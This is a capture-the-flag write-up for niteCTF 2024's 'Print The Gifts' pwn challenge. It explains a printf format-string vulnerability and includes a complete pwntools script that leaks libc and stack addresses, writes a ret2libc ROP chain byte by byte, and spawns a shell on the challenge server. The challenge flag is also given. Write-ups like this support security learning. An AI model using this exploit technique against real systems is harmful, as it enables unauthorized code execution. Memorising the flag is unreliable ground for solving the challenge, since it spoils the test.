https://ctftime.org/event/2461

# Print The Gifts (pwn)

Santa has come with a lot of gifts, do not exploit his kindess unless you want to end up on the naughty list...

ncat --ssl print-the-gifts.chals.nitectf2024.live 1337

## Analysis

`main` @ `0x1199`
- Uses `fgets` to read attacker controlled input
- Passes attacked controlled input as the format string to `printf`
- Allows us to loop to the start of the function if we wish

## Solution

Note: In order to get the same behaviour as the remote I used `pwninit`, which can be found here https://github.com/io12/pwninit, to patch `chal` to use the provided `ld-linux-x86-64.so.2`.

1) Leak a pointer to libc which is offset by `0x27305` bytes to compute the libc base
    - The offset is found using the `xinfo` command in `pwndbg` on the pointer in the patched binary.
2) Leak a pointer to the stack which is offset by `0x21a8` bytes from the return address of `vuln`
    - The offset is found using the `xinfo` command in `pwndbg` on the pointer in the patched binary and comparing it to the return address with the `retaddr` command.
3) Write a ret2libc rop payload one byte at a time
    - It may be possible to do this in fewer larger writes. However seeing as a simple byte write to sequentially increasing addresses is the easiest to construct format strings for and that we are not limited by the number of writes we can perform I decided to keep it simple and write the payload a byte at a time.

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chall_patched", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("print-the-gifts.chals.nitectf2024.live", 1337, ssl=True)

p.sendlineafter(b">", b"%43$p")
p.readuntil(b"Santa brought you a ")
leak = int(p.readline().decode(), 16)
libc.address = leak - 0x27305
log.success(f"libc: {hex(libc.address)}")
p.sendlineafter(b"y or n:\n", b"y")

p.sendlineafter(b">", b"%1$p")
p.readuntil(b"Santa brought you a ")
leak = int(p.readline().decode(), 16)
retaddr = leak + 0x21a8
log.success(f"ret: {hex(retaddr)}")

rop = ROP(libc)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
payload = rop.chain()

for i in range(len(payload)):
    p.sendlineafter(b"y or n:\n", b"y")
    p.sendlineafter(b">", fmtstr_payload(8, {retaddr + i: p8(payload[i])}))
    
p.sendlineafter(b"y or n:\n", b"n")

p.interactive() # nite{0nLy_n4ugHty_k1d5_Use_%n}
```

## Flag
`nite{0nLy_n4ugHty_k1d5_Use_%n}`

smiley 2024/12/14
